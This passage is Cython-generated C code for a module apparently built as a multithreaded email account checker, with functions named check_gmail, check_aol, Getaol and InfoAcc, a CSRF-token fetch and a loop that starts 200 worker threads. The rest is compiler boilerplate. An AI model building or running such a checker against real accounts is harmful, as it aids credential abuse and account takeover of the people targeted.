        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 271, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
          }
        }
        __pyx_t_13 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_1, __pyx_n_u_csrftoken_2) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_n_u_csrftoken_2);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 271, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_csrf, __pyx_t_13) < 0) __PYX_ERR(0, 271, __pyx_L39_error)
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

        
        goto __pyx_L44_try_break;

        
      }
      __pyx_L39_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

      
      __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
      if (__pyx_t_6) {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L40_exception_handled;
      }
      goto __pyx_L41_except_error;
      __pyx_L41_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
      goto __pyx_L1_error;
      __pyx_L44_try_break:;
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
      goto __pyx_L38_break;
      __pyx_L40_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    }
  }
  __pyx_L38_break:;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_yy, __pyx_n_u_azertyuiopmlkjhgfdsqwxcvbn) < 0) __PYX_ERR(0, 276, __pyx_L1_error)

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_13tll, 0, __pyx_n_s_tll, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__108)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 279, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tll, __pyx_t_13) < 0) __PYX_ERR(0, 279, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_tll); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 329, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_12 = __Pyx_PyObject_CallNoArg(__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 329, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  
  __pyx_t_12 = __Pyx_CyFunction_New(&__pyx_mdef_6source_15Getaol, 0, __pyx_n_s_Getaol, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__110)); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 332, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Getaol, __pyx_t_12) < 0) __PYX_ERR(0, 332, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_Getaol); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 374, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_13 = __Pyx_PyObject_CallNoArg(__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 374, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_17check_gmail, 0, __pyx_n_s_check_gmail, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__112)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check_gmail, __pyx_t_13) < 0) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_19check_aol, 0, __pyx_n_s_check_aol, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__114)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 433, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check_aol, __pyx_t_13) < 0) __PYX_ERR(0, 433, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_21check, 0, __pyx_n_s_check, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__116)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 505, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check, __pyx_t_13) < 0) __PYX_ERR(0, 505, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_23rest, 0, __pyx_n_s_rest, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__118)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 542, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rest, __pyx_t_13) < 0) __PYX_ERR(0, 542, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_25date, 0, __pyx_n_s_date, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__120)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 580, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_13) < 0) __PYX_ERR(0, 580, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_27InfoAcc, 0, __pyx_n_s_InfoAcc, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__122)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 609, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InfoAcc, __pyx_t_13) < 0) __PYX_ERR(0, 609, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_29gg, 0, __pyx_n_s_gg, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__124)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 661, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_gg, __pyx_t_13) < 0) __PYX_ERR(0, 661, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  for (__pyx_t_17 = 0; __pyx_t_17 < 0xC8; __pyx_t_17+=1) {
    __pyx_t_13 = __Pyx_PyInt_From_long(__pyx_t_17); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 685, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s__85, __pyx_t_13) < 0) __PYX_ERR(0, 685, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_Thread); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 686, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_12);
    __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 686, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_gg); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 686, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_target, __pyx_t_11) < 0) __PYX_ERR(0, 686, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_empty_tuple, __pyx_t_1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 686, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_start); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 686, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __pyx_t_11 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_11)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_11);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_13 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 686, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  }

  
  __pyx_t_13 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_13) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_13);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* PyIntCompare */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_TRUE;
    }
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a == b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
